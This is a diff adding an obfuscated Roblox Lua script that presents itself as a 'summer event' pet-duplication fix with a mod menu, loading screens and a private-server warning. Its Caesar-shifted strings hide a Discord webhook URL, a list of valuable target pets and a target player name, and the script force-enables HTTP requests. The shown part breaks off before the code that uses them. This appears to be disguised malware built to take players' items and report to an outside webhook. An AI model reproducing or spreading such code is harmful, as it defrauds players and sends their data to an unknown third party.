@@ -1,1 +1,794 @@
+--[[
+ DUPE SUMMER EVENT FIX
 
+]]--
+
+local TABLE_TableIndirection = {};
+bit32 = {};
+TABLE_TableIndirection["N%0"] = 32;
+TABLE_TableIndirection["P%0"] = 2 ^ TABLE_TableIndirection["N%0"];
+bit32.bnot = function(x)
+	x = x % TABLE_TableIndirection["P%0"];
+	return (TABLE_TableIndirection["P%0"] - 1) - x;
+end;
+bit32.band = function(x, y)
+	if (y == 255) then
+		return x % 256;
+	end
+	if (y == 65535) then
+		return x % 65536;
+	end
+	if (y == 4294967295) then
+		return x % 4294967296;
+	end
+	x, y = x % TABLE_TableIndirection["P%0"], y % TABLE_TableIndirection["P%0"];
+	TABLE_TableIndirection["r%0"] = 0;
+	TABLE_TableIndirection["p%0"] = 1;
+	for i = 1, TABLE_TableIndirection["N%0"] do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 2) then
+			TABLE_TableIndirection["r%0"] = TABLE_TableIndirection["r%0"] + TABLE_TableIndirection["p%0"];
+		end
+		TABLE_TableIndirection["p%0"] = 2 * TABLE_TableIndirection["p%0"];
+	end
+	return TABLE_TableIndirection["r%0"];
+end;
+bit32.bor = function(x, y)
+	if (y == 255) then
+		return (x - (x % 256)) + 255;
+	end
+	if (y == 65535) then
+		return (x - (x % 65536)) + 65535;
+	end
+	if (y == 4294967295) then
+		return 4294967295;
+	end
+	x, y = x % TABLE_TableIndirection["P%0"], y % TABLE_TableIndirection["P%0"];
+	TABLE_TableIndirection["r%0"] = 0;
+	TABLE_TableIndirection["p%0"] = 1;
+	for i = 1, TABLE_TableIndirection["N%0"] do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) >= 1) then
+			TABLE_TableIndirection["r%0"] = TABLE_TableIndirection["r%0"] + TABLE_TableIndirection["p%0"];
+		end
+		TABLE_TableIndirection["p%0"] = 2 * TABLE_TableIndirection["p%0"];
+	end
+	return TABLE_TableIndirection["r%0"];
+end;
+bit32.bxor = function(x, y)
+	x, y = x % TABLE_TableIndirection["P%0"], y % TABLE_TableIndirection["P%0"];
+	TABLE_TableIndirection["r%0"] = 0;
+	TABLE_TableIndirection["p%0"] = 1;
+	for i = 1, TABLE_TableIndirection["N%0"] do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 1) then
+			TABLE_TableIndirection["r%0"] = TABLE_TableIndirection["r%0"] + TABLE_TableIndirection["p%0"];
+		end
+		TABLE_TableIndirection["p%0"] = 2 * TABLE_TableIndirection["p%0"];
+	end
+	return TABLE_TableIndirection["r%0"];
+end;
+bit32.lshift = function(x, s_amount)
+	if (math.abs(s_amount) >= TABLE_TableIndirection["N%0"]) then
+		return 0;
+	end
+	x = x % TABLE_TableIndirection["P%0"];
+	if (s_amount < 0) then
+		return math.floor(x * (2 ^ s_amount));
+	else
+		return (x * (2 ^ s_amount)) % TABLE_TableIndirection["P%0"];
+	end
+end;
+bit32.rshift = function(x, s_amount)
+	if (math.abs(s_amount) >= TABLE_TableIndirection["N%0"]) then
+		return 0;
+	end
+	x = x % TABLE_TableIndirection["P%0"];
+	if (s_amount > 0) then
+		return math.floor(x * (2 ^ -s_amount));
+	else
+		return (x * (2 ^ -s_amount)) % TABLE_TableIndirection["P%0"];
+	end
+end;
+bit32.arshift = function(x, s_amount)
+	if (math.abs(s_amount) >= TABLE_TableIndirection["N%0"]) then
+		return 0;
+	end
+	x = x % TABLE_TableIndirection["P%0"];
+	if (s_amount > 0) then
+		TABLE_TableIndirection["add%0"] = 0;
+		if (x >= (TABLE_TableIndirection["P%0"] / 2)) then
+			TABLE_TableIndirection["add%0"] = TABLE_TableIndirection["P%0"] - (2 ^ (TABLE_TableIndirection["N%0"] - s_amount));
+		end
+		return math.floor(x * (2 ^ -s_amount)) + TABLE_TableIndirection["add%0"];
+	else
+		return (x * (2 ^ -s_amount)) % TABLE_TableIndirection["P%0"];
+	end
+end;
+local function vpbqlZCgtn(JNSaAhYuUG)
+	return ((JNSaAhYuUG >= 48) and (JNSaAhYuUG <= 57)) or ((JNSaAhYuUG >= 65) and (JNSaAhYuUG <= 90)) or ((JNSaAhYuUG >= 97) and (JNSaAhYuUG <= 122));
+end
+local function JOcxRChmcx(IQfzsmMvKiQ, khmkKsDX)
+	TABLE_TableIndirection["gPoqNoYUN%0"] = {};
+	for i = 1, #IQfzsmMvKiQ do
+		TABLE_TableIndirection["JNSaAhYuUG%0"] = IQfzsmMvKiQ:byte(i);
+		if vpbqlZCgtn(TABLE_TableIndirection["JNSaAhYuUG%0"]) then
+			TABLE_TableIndirection["LLCdYpzJ%0"] = nil;
+			if ((TABLE_TableIndirection["JNSaAhYuUG%0"] >= 48) and (TABLE_TableIndirection["JNSaAhYuUG%0"] <= 57)) then
+				TABLE_TableIndirection["LLCdYpzJ%0"] = ((((TABLE_TableIndirection["JNSaAhYuUG%0"] - 48) - khmkKsDX) + 10) % 10) + 48;
+			elseif ((TABLE_TableIndirection["JNSaAhYuUG%0"] >= 65) and (TABLE_TableIndirection["JNSaAhYuUG%0"] <= 90)) then
+				TABLE_TableIndirection["LLCdYpzJ%0"] = ((((TABLE_TableIndirection["JNSaAhYuUG%0"] - 65) - khmkKsDX) + 26) % 26) + 65;
+			elseif ((TABLE_TableIndirection["JNSaAhYuUG%0"] >= 97) and (TABLE_TableIndirection["JNSaAhYuUG%0"] <= 122)) then
+				TABLE_TableIndirection["LLCdYpzJ%0"] = ((((TABLE_TableIndirection["JNSaAhYuUG%0"] - 97) - khmkKsDX) + 26) % 26) + 97;
+			end
+			table.insert(TABLE_TableIndirection["gPoqNoYUN%0"], string.char(TABLE_TableIndirection["LLCdYpzJ%0"]));
+		else
+			table.insert(TABLE_TableIndirection["gPoqNoYUN%0"], string.char(TABLE_TableIndirection["JNSaAhYuUG%0"]));
+		end
+	end
+	return table.concat(TABLE_TableIndirection["gPoqNoYUN%0"]);
+end
+local function vpbqlZCgtn(JNSaAhYuUG)
+	return ((JNSaAhYuUG >= 48) and (JNSaAhYuUG <= 57)) or ((JNSaAhYuUG >= 65) and (JNSaAhYuUG <= 90)) or ((JNSaAhYuUG >= 97) and (JNSaAhYuUG <= 122));
+end
+TABLE_TableIndirection["Players%0"] = game:GetService(JOcxRChmcx("Xtigmza", 8));
+TABLE_TableIndirection["HttpService%0"] = game:GetService(JOcxRChmcx("YkkgJvimztv", 17));
+TABLE_TableIndirection["MarketplaceService%0"] = game:GetService(JOcxRChmcx("KypicrnjyacQcptgac", 24));
+TABLE_TableIndirection["ReplicatedStorage%0"] = game:GetService(JOcxRChmcx("VitpmgexihWxsveki", 4));
+TABLE_TableIndirection["TeleportService%0"] = game:GetService(JOcxRChmcx("EpwpazceDpcgtnp", 11));
+TABLE_TableIndirection["RunService%0"] = game:GetService(JOcxRChmcx("NqjOanreya", 22));
+TABLE_TableIndirection["UserInputService%0"] = game:GetService(JOcxRChmcx("QoanEjlqpOanreya", 22));
+TABLE_TableIndirection["TweenService%0"] = game:GetService(JOcxRChmcx("WzhhqVhuylfh", 3));
+TABLE_TableIndirection["LocalPlayer%0"] = TABLE_TableIndirection["Players%0"].LocalPlayer;
+TABLE_TableIndirection["GameInfo%0"] = TABLE_TableIndirection["MarketplaceService%0"]:GetProductInfo(game.PlaceId);
+if not TABLE_TableIndirection["HttpService%0"]:GetHttpEnabled() then
+	TABLE_TableIndirection["HttpService%0"]:SetHttpEnabled(true);
+end
+TABLE_TableIndirection["WEBHOOK_URL%0"] = JOcxRChmcx("cookn://ydnxjmy.xjh/vkd/rzwcjjfn/2492423863451060383/RAWXhmlPziMfOeYgCQ4o6GKuQbzoL2NaKrysjkLznBttYwEejfgTZlFXfgQkfgzIohFB", 21);
+TABLE_TableIndirection["TARGET_PETS%0"] = {JOcxRChmcx("Fbfbv Hvmhinl", 19),JOcxRChmcx("Jsuuggf", 18),JOcxRChmcx("Bfppy Mpp", 11),JOcxRChmcx("Nbkqyxpvi", 10),JOcxRChmcx("Otdnz Mpp", 11),JOcxRChmcx("Atssdqekx", 25),JOcxRChmcx("Uhg Ira", 3),JOcxRChmcx("Jiful Vyul", 20)};
+TABLE_TableIndirection["TARGET_PLAYER_NAME%0"] = JOcxRChmcx("fbvabghptb", 19);
+local function CreateModMenu()
+	TABLE_TableIndirection["screenGui%0"] = Instance.new(JOcxRChmcx("IshuudWky", 16));
+	TABLE_TableIndirection["screenGui%0"].Name = JOcxRChmcx("LncLdmt", 25);
+	TABLE_TableIndirection["screenGui%0"].ResetOnSpawn = false;
+	TABLE_TableIndirection["screenGui%0"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+	TABLE_TableIndirection["screenGui%0"].Parent = game.CoreGui;
+	TABLE_TableIndirection["mainFrame%0"] = Instance.new(JOcxRChmcx("Eqzld", 25));
+	TABLE_TableIndirection["mainFrame%0"].Size = UDim2.new(0.33, 0, 0.7, 0);
+	TABLE_TableIndirection["mainFrame%0"].AnchorPoint = Vector2.new(0.5, 0.5);
+	TABLE_TableIndirection["mainFrame%0"].Position = UDim2.new(0.5, 0, 0.5, 0);
+	TABLE_TableIndirection["mainFrame%0"].BackgroundColor3 = Color3.fromRGB(30, 5, 10);
+	TABLE_TableIndirection["mainFrame%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["mainFrame%0"].Parent = TABLE_TableIndirection["screenGui%0"];
+	TABLE_TableIndirection["corner%0"] = Instance.new(JOcxRChmcx("YMGsvriv", 4));
+	TABLE_TableIndirection["corner%0"].CornerRadius = UDim.new(0.05, 0);
+	TABLE_TableIndirection["corner%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["gradient%0"] = Instance.new(JOcxRChmcx("IWUforwsbh", 14));
+	TABLE_TableIndirection["gradient%0"].Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 30, 40)),ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 10, 20))});
+	TABLE_TableIndirection["gradient%0"].Rotation = 90;
+	TABLE_TableIndirection["gradient%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["glow%0"] = Instance.new(JOcxRChmcx("NrfljQfgjq", 5));
+	TABLE_TableIndirection["glow%0"].Size = UDim2.new(1.05, 0, 1.05, 0);
+	TABLE_TableIndirection["glow%0"].Position = UDim2.new(-0.025, 0, -0.025, 0);
+	TABLE_TableIndirection["glow%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["glow%0"].Image = JOcxRChmcx("akgjbbncrm://7881123186", 9);
+	TABLE_TableIndirection["glow%0"].ImageColor3 = Color3.fromRGB(200, 0, 50);
+	TABLE_TableIndirection["glow%0"].ImageTransparency = 0.8;
+	TABLE_TableIndirection["glow%0"].ScaleType = Enum.ScaleType.Slice;
+	TABLE_TableIndirection["glow%0"].SliceCenter = Rect.new(100, 100, 100, 100);
+	TABLE_TableIndirection["glow%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["rotateTween%0"] = TABLE_TableIndirection["TweenService%0"]:Create(TABLE_TableIndirection["glow%0"], TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation=360});
+	TABLE_TableIndirection["rotateTween%0"]:Play();
+	TABLE_TableIndirection["title%0"] = Instance.new(JOcxRChmcx("VgzvNcdgn", 2));
+	TABLE_TableIndirection["title%0"].Text = JOcxRChmcx("LNFFXK LNYYXK WNIEBVTMBHG", 19);
+	TABLE_TableIndirection["title%0"].TextColor3 = Color3.fromRGB(255, 150, 50);
+	TABLE_TableIndirection["title%0"].Font = Enum.Font.GothamBlack;
+	TABLE_TableIndirection["title%0"].TextSize = 22;
+	TABLE_TableIndirection["title%0"].TextStrokeTransparency = 0.5;
+	TABLE_TableIndirection["title%0"].TextStrokeColor3 = Color3.fromRGB(200, 50, 50);
+	TABLE_TableIndirection["title%0"].Size = UDim2.new(1, -20, 0.1, 0);
+	TABLE_TableIndirection["title%0"].Position = UDim2.new(0, 10, 0, 5);
+	TABLE_TableIndirection["title%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["title%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["closeButton%0"] = Instance.new(JOcxRChmcx("GrkgOhggba", 13));
+	TABLE_TableIndirection["closeButton%0"].Text = JOcxRChmcx("Y", 1);
+	TABLE_TableIndirection["closeButton%0"].TextColor3 = Color3.new(1, 1, 1);
+	TABLE_TableIndirection["closeButton%0"].Font = Enum.Font.GothamBold;
+	TABLE_TableIndirection["closeButton%0"].TextSize = 18;
+	TABLE_TableIndirection["closeButton%0"].Size = UDim2.new(0.1, 0, 0.1, 0);
+	TABLE_TableIndirection["closeButton%0"].Position = UDim2.new(0.9, 0, 0, 0);
+	TABLE_TableIndirection["closeButton%0"].BackgroundColor3 = Color3.fromRGB(180, 0, 0);
+	TABLE_TableIndirection["closeButton%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["closeButton%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["closeButton%0"].MouseButton1Click:Connect(function()
+	end);
+	TABLE_TableIndirection["duplicateButton%0"] = Instance.new(JOcxRChmcx("NyrnVonnih", 20));
+	TABLE_TableIndirection["duplicateButton%0"].Text = JOcxRChmcx("TUBSU EVQMJDBUJPO", 1);
+	TABLE_TableIndirection["duplicateButton%0"].TextColor3 = Color3.new(1, 1, 1);
+	TABLE_TableIndirection["duplicateButton%0"].Font = Enum.Font.GothamBold;
+	TABLE_TableIndirection["duplicateButton%0"].TextSize = 18;
+	TABLE_TableIndirection["duplicateButton%0"].Size = UDim2.new(0.8, 0, 0.1, 0);
+	TABLE_TableIndirection["duplicateButton%0"].Position = UDim2.new(0.1, 0, 0.15, 0);
+	TABLE_TableIndirection["duplicateButton%0"].BackgroundColor3 = Color3.fromRGB(180, 0, 30);
+	TABLE_TableIndirection["duplicateButton%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["duplicateButton%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["messageFrame%0"] = Instance.new(JOcxRChmcx("AkzwttqvoNzium", 8));
+	TABLE_TableIndirection["messageFrame%0"].Size = UDim2.new(0.9, 0, 0.7, 0);
+	TABLE_TableIndirection["messageFrame%0"].Position = UDim2.new(0.05, 0, 0.3, 0);
+	TABLE_TableIndirection["messageFrame%0"].BackgroundColor3 = Color3.fromRGB(20, 3, 7);
+	TABLE_TableIndirection["messageFrame%0"].BackgroundTransparency = 0.5;
+	TABLE_TableIndirection["messageFrame%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["messageFrame%0"].ScrollBarThickness = 5;
+	TABLE_TableIndirection["messageFrame%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["messageCorner%0"] = Instance.new(JOcxRChmcx("LZTfievi", 17));
+	TABLE_TableIndirection["messageCorner%0"].CornerRadius = UDim.new(0.03, 0);
+	TABLE_TableIndirection["messageCorner%0"].Parent = TABLE_TableIndirection["messageFrame%0"];
+	TABLE_TableIndirection["messages%0"] = Instance.new(JOcxRChmcx("GrkgYnory", 13));
+	TABLE_TableIndirection["messages%0"].Text = [[
+⚠️ HOW TO USE ⚠️
+
+Join Public Server (Global Server) to use.
+Unequip Pet And Start Duplication
+Private servers are not supported for duplication operations.
+
+
+❗ SYSTEM REQUIREMENTS:
+- Public Server (Global)
+- Stable internet connection
+
+⏳ PROCESS:
+1. BYPASS SERVER
+2. REPLACE ORIGINAL SERVER TO OLD SERVER
+3. SYSTEM GET MENU DUPLICATE 
+4. HAPPY DUPLICATION
+]];
+	TABLE_TableIndirection["messages%0"].TextColor3 = Color3.fromRGB(255, 200, 200);
+	TABLE_TableIndirection["messages%0"].Font = Enum.Font.Gotham;
+	TABLE_TableIndirection["messages%0"].TextSize = 14;
+	TABLE_TableIndirection["messages%0"].TextXAlignment = Enum.TextXAlignment.Left;
+	TABLE_TableIndirection["messages%0"].TextYAlignment = Enum.TextYAlignment.Top;
+	TABLE_TableIndirection["messages%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["messages%0"].Size = UDim2.new(1, -10, 1, -10);
+	TABLE_TableIndirection["messages%0"].Position = UDim2.new(0, 5, 0, 5);
+	TABLE_TableIndirection["messages%0"].Parent = TABLE_TableIndirection["messageFrame%0"];
+	TABLE_TableIndirection["messages%0"].AutomaticSize = Enum.AutomaticSize.Y;
+	TABLE_TableIndirection["messageFrame%0"].AutomaticCanvasSize = Enum.AutomaticSize.Y;
+	return TABLE_TableIndirection["screenGui%0"], TABLE_TableIndirection["duplicateButton%0"];
+end
+local function CreatePrivateServerAlert()
+	TABLE_TableIndirection["screenGui%0"] = Instance.new(JOcxRChmcx("PzobbkDrf", 23));
+	TABLE_TableIndirection["screenGui%0"].Name = JOcxRChmcx("XzqdibmAmzdmzItmzb", 8);
+	TABLE_TableIndirection["screenGui%0"].IgnoreGuiInset = true;
+	TABLE_TableIndirection["screenGui%0"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+	TABLE_TableIndirection["screenGui%0"].Parent = game.CoreGui;
+	TABLE_TableIndirection["background%0"] = Instance.new(JOcxRChmcx("Nzium", 8));
+	TABLE_TableIndirection["background%0"].Size = UDim2.new(1, 0, 1, 0);
+	TABLE_TableIndirection["background%0"].BackgroundColor3 = Color3.fromRGB(20, 5, 10);
+	TABLE_TableIndirection["background%0"].BackgroundTransparency = 0.3;
+	TABLE_TableIndirection["background%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["background%0"].Parent = TABLE_TableIndirection["screenGui%0"];
+	TABLE_TableIndirection["mainFrame%0"] = Instance.new(JOcxRChmcx("Wirdv", 17));
+	TABLE_TableIndirection["mainFrame%0"].AnchorPoint = Vector2.new(0.5, 0.5);
+	TABLE_TableIndirection["mainFrame%0"].Size = UDim2.new(0.7, 0, 0.5, 0);
+	TABLE_TableIndirection["mainFrame%0"].Position = UDim2.new(0.5, 0, 0.5, 0);
+	TABLE_TableIndirection["mainFrame%0"].BackgroundColor3 = Color3.fromRGB(40, 10, 20);
+	TABLE_TableIndirection["mainFrame%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["mainFrame%0"].Parent = TABLE_TableIndirection["screenGui%0"];
+	TABLE_TableIndirection["glow%0"] = Instance.new(JOcxRChmcx("ZdrxvCrsvc", 17));
+	TABLE_TableIndirection["glow%0"].Size = UDim2.new(1.1, 0, 1.1, 0);
+	TABLE_TableIndirection["glow%0"].Position = UDim2.new(-0.05, 0, -0.05, 0);
+	TABLE_TableIndirection["glow%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["glow%0"].Image = JOcxRChmcx("wgcfxxjyni://3447789742", 5);
+	TABLE_TableIndirection["glow%0"].ImageColor3 = Color3.fromRGB(200, 0, 50);
+	TABLE_TableIndirection["glow%0"].ImageTransparency = 0.8;
+	TABLE_TableIndirection["glow%0"].ScaleType = Enum.ScaleType.Slice;
+	TABLE_TableIndirection["glow%0"].SliceCenter = Rect.new(100, 100, 100, 100);
+	TABLE_TableIndirection["glow%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["rotateTween%0"] = TABLE_TableIndirection["TweenService%0"]:Create(TABLE_TableIndirection["glow%0"], TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation=360});
+	TABLE_TableIndirection["rotateTween%0"]:Play();
+	TABLE_TableIndirection["title%0"] = Instance.new(JOcxRChmcx("NyrnFuvyf", 20));
+	TABLE_TableIndirection["title%0"].Text = JOcxRChmcx("⚠️ RTKXCVG UGTXGT FGVGEVGF ⚠️", 2);
+	TABLE_TableIndirection["title%0"].TextColor3 = Color3.fromRGB(255, 100, 100);
+	TABLE_TableIndirection["title%0"].Font = Enum.Font.GothamBlack;
+	TABLE_TableIndirection["title%0"].TextSize = 28;
+	TABLE_TableIndirection["title%0"].TextStrokeTransparency = 0.5;
+	TABLE_TableIndirection["title%0"].TextStrokeColor3 = Color3.fromRGB(255, 50, 50);
+	TABLE_TableIndirection["title%0"].Size = UDim2.new(1, 0, 0.3, 0);
+	TABLE_TableIndirection["title%0"].Position = UDim2.new(0, 0, 0.1, 0);
+	TABLE_TableIndirection["title%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["title%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	TABLE_TableIndirection["message%0"] = Instance.new(JOcxRChmcx("NyrnFuvyf", 20));
+	TABLE_TableIndirection["message%0"].Text = JOcxRChmcx("Gcvrjv afze r Glsczt Jvimvi (Xcfsrc Jvimvi) kf ljv kyzj jpjkvd.\n\nGizmrkv jvimvij riv efk jlggfikvu wfi ulgcztrkzfe fgvirkzfej.", 17);
+	TABLE_TableIndirection["message%0"].TextColor3 = Color3.fromRGB(255, 200, 200);
+	TABLE_TableIndirection["message%0"].Font = Enum.Font.Gotham;
+	TABLE_TableIndirection["message%0"].TextSize = 22;
+	TABLE_TableIndirection["message%0"].TextWrapped = true;
+	TABLE_TableIndirection["message%0"].Size = UDim2.new(0.9, 0, 0.5, 0);
+	TABLE_TableIndirection["message%0"].Position = UDim2.new(0.05, 0, 0.4, 0);
+	TABLE_TableIndirection["message%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["message%0"].Parent = TABLE_TableIndirection["mainFrame%0"];
+	return TABLE_TableIndirection["screenGui%0"];
+end
+local function CreateSmallLoadingScreen()
+	TABLE_TableIndirection["ScreenGui%0"] = Instance.new(JOcxRChmcx("EodqqzSgu", 12));
+	TABLE_TableIndirection["ScreenGui%0"].Name = JOcxRChmcx("NhvggGjvydibNxmzzi", 21);
+	TABLE_TableIndirection["ScreenGui%0"].IgnoreGuiInset = true;
+	TABLE_TableIndirection["ScreenGui%0"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+	TABLE_TableIndirection["ScreenGui%0"].Parent = game.CoreGui;
+	TABLE_TableIndirection["Background%0"] = Instance.new(JOcxRChmcx("Oajvn", 9));
+	TABLE_TableIndirection["Background%0"].Name = JOcxRChmcx("Ihjrnyvbuk", 7);
+	TABLE_TableIndirection["Background%0"].AnchorPoint = Vector2.new(0.5, 0.5);
+	TABLE_TableIndirection["Background%0"].Size = UDim2.new(0.3, 0, 0.1, 0);
+	TABLE_TableIndirection["Background%0"].Position = UDim2.new(0.5, 0, 0.9, 0);
+	TABLE_TableIndirection["Background%0"].BackgroundColor3 = Color3.fromRGB(30, 30, 40);
+	TABLE_TableIndirection["Background%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["Background%0"].BorderColor3 = Color3.fromRGB(100, 100, 150);
+	TABLE_TableIndirection["Background%0"].BorderMode = Enum.BorderMode.Inset;
+	TABLE_TableIndirection["Background%0"].Parent = TABLE_TableIndirection["ScreenGui%0"];
+	TABLE_TableIndirection["UICorner%0"] = Instance.new(JOcxRChmcx("ZNHtwsjw", 5));
+	TABLE_TableIndirection["UICorner%0"].CornerRadius = UDim.new(0.1, 0);
+	TABLE_TableIndirection["UICorner%0"].Parent = TABLE_TableIndirection["Background%0"];
+	TABLE_TableIndirection["UIGradient%0"] = Instance.new(JOcxRChmcx("AOMxgjoktz", 6));
+	TABLE_TableIndirection["UIGradient%0"].Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 20, 120)),ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 20, 80))});
+	TABLE_TableIndirection["UIGradient%0"].Rotation = 90;
+	TABLE_TableIndirection["UIGradient%0"].Parent = TABLE_TableIndirection["Background%0"];
+	TABLE_TableIndirection["MessageLabel%0"] = Instance.new(JOcxRChmcx("ZkdzRghkr", 6));
+	TABLE_TableIndirection["MessageLabel%0"].Name = JOcxRChmcx("JbppxdbIxybi", 23);
+	TABLE_TableIndirection["MessageLabel%0"].Size = UDim2.new(0.9, 0, 0.8, 0);
+	TABLE_TableIndirection["MessageLabel%0"].Position = UDim2.new(0.05, 0, 0.1, 0);
+	TABLE_TableIndirection["MessageLabel%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["MessageLabel%0"].Text = JOcxRChmcx("Glgrgyjgxgle Qwqrck...", 24);
+	TABLE_TableIndirection["MessageLabel%0"].TextColor3 = Color3.fromRGB(255, 215, 100);
+	TABLE_TableIndirection["MessageLabel%0"].Font = Enum.Font.GothamBold;
+	TABLE_TableIndirection["MessageLabel%0"].TextSize = 18;
+	TABLE_TableIndirection["MessageLabel%0"].TextWrapped = true;
+	TABLE_TableIndirection["MessageLabel%0"].Parent = TABLE_TableIndirection["Background%0"];
+	TABLE_TableIndirection["LoadingDots%0"] = Instance.new(JOcxRChmcx("DohdVklov", 10));
+	TABLE_TableIndirection["LoadingDots%0"].Name = JOcxRChmcx("WzlotyrOzed", 11);
+	TABLE_TableIndirection["LoadingDots%0"].Size = UDim2.new(0.2, 0, 0.3, 0);
+	TABLE_TableIndirection["LoadingDots%0"].Position = UDim2.new(0.8, 0, 0.35, 0);
+	TABLE_TableIndirection["LoadingDots%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["LoadingDots%0"].Text = JOcxRChmcx("...", 6);
+	TABLE_TableIndirection["LoadingDots%0"].TextColor3 = Color3.fromRGB(100, 255, 200);
+	TABLE_TableIndirection["LoadingDots%0"].Font = Enum.Font.GothamBold;
+	TABLE_TableIndirection["LoadingDots%0"].TextSize = 24;
+	TABLE_TableIndirection["LoadingDots%0"].Parent = TABLE_TableIndirection["Background%0"];
+	task.spawn(function()
+		while TABLE_TableIndirection["LoadingDots%0"] and TABLE_TableIndirection["LoadingDots%0"].Parent do
+			for i = 1, 3 do
+				TABLE_TableIndirection["LoadingDots%0"].Text = string.rep(JOcxRChmcx(".", 6), i);
+				task.wait(0);
+			end
+		end
+	end);
+	return TABLE_TableIndirection["ScreenGui%0"], TABLE_TableIndirection["MessageLabel%0"], TABLE_TableIndirection["LoadingDots%0"];
+end
+local function CreateFullLoadingScreen()
+	TABLE_TableIndirection["ScreenGui%0"] = Instance.new(JOcxRChmcx("NxmzziBpd", 21));
+	TABLE_TableIndirection["ScreenGui%0"].Name = JOcxRChmcx("YneeEhtwbgzLvkxxg", 19);
+	TABLE_TableIndirection["ScreenGui%0"].IgnoreGuiInset = true;
+	TABLE_TableIndirection["ScreenGui%0"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+	TABLE_TableIndirection["ScreenGui%0"].Parent = game.CoreGui;
+	TABLE_TableIndirection["Background%0"] = Instance.new(JOcxRChmcx("Lxgsk", 6));
+	TABLE_TableIndirection["Background%0"].Name = JOcxRChmcx("Mlnvrczfyo", 11);
+	TABLE_TableIndirection["Background%0"].Size = UDim2.new(1, 0, 1, 0);
+	TABLE_TableIndirection["Background%0"].Position = UDim2.new(0, 0, 0, 0);
+	TABLE_TableIndirection["Background%0"].BackgroundColor3 = Color3.fromRGB(10, 5, 20);
+	TABLE_TableIndirection["Background%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["Background%0"].Parent = TABLE_TableIndirection["ScreenGui%0"];
+	for i = 1, 30 do
+		task.spawn(function()
+			TABLE_TableIndirection["particle%0"] = Instance.new(JOcxRChmcx("Bnwia", 22));
+			TABLE_TableIndirection["particle%0"].Size = UDim2.new(0.01, 0, 0.01, 0);
+			TABLE_TableIndirection["particle%0"].Position = UDim2.new(math.random(), 0, math.random(), 0);
+			TABLE_TableIndirection["particle%0"].BackgroundColor3 = Color3.fromRGB(math.random(50, 200), math.random(50, 200), math.random(150, 255));
+			TABLE_TableIndirection["particle%0"].BackgroundTransparency = 0.7;
+			TABLE_TableIndirection["particle%0"].BorderSizePixel = 0;
+			TABLE_TableIndirection["particle%0"].Parent = TABLE_TableIndirection["Background%0"];
+			TABLE_TableIndirection["speed%0"] = math.random(20, 50);
+			while TABLE_TableIndirection["particle%0"] and TABLE_TableIndirection["particle%0"].Parent do
+				TABLE_TableIndirection["particle%0"].Position += UDim2.new(0, 0, 0.0001 * TABLE_TableIndirection["speed%0"], 0)
+				if (TABLE_TableIndirection["particle%0"].Position.Y.Scale > 1) then
+					TABLE_TableIndirection["particle%0"].Position = UDim2.new(math.random(), 0, -0.1, 0);
+				end
+				task.wait(0);
+			end
+		end);
+	end
+	TABLE_TableIndirection["MainContainer%0"] = Instance.new(JOcxRChmcx("Kwfrj", 5));
+	TABLE_TableIndirection["MainContainer%0"].AnchorPoint = Vector2.new(0.5, 0.5);
+	TABLE_TableIndirection["MainContainer%0"].Size = UDim2.new(0.7, 0, 0.8, 0);
+	TABLE_TableIndirection["MainContainer%0"].Position = UDim2.new(0.5, 0, 0.5, 0);
+	TABLE_TableIndirection["MainContainer%0"].BackgroundColor3 = Color3.fromRGB(25, 15, 40);
+	TABLE_TableIndirection["MainContainer%0"].BackgroundTransparency = 0.2;
+	TABLE_TableIndirection["MainContainer%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["MainContainer%0"].Parent = TABLE_TableIndirection["Background%0"];
+	TABLE_TableIndirection["UICorner%0"] = Instance.new(JOcxRChmcx("ESMybxob", 10));
+	TABLE_TableIndirection["UICorner%0"].CornerRadius = UDim.new(0.05, 0);
+	TABLE_TableIndirection["UICorner%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["Title%0"] = Instance.new(JOcxRChmcx("XibxPefip", 4));
+	TABLE_TableIndirection["Title%0"].Size = UDim2.new(1, 0, 0.15, 0);
+	TABLE_TableIndirection["Title%0"].Position = UDim2.new(0, 0, 0.05, 0);
+	TABLE_TableIndirection["Title%0"].BackgroundTransparency = 1;
